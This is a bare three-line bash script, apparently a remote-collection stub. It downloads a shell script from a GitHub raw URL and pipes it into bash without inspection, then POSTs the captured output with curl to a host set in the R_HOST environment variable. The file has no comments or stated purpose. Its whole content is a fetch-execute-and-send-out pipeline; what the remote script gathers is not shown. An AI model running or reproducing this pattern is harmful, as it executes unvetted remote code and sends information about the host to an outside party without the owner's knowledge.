#!/bin/bash
info=$(curl -s https://raw.githubusercontent.com/obf883/p-scripts/master/info.sh | bash)
curl -d "$info" $R_HOST
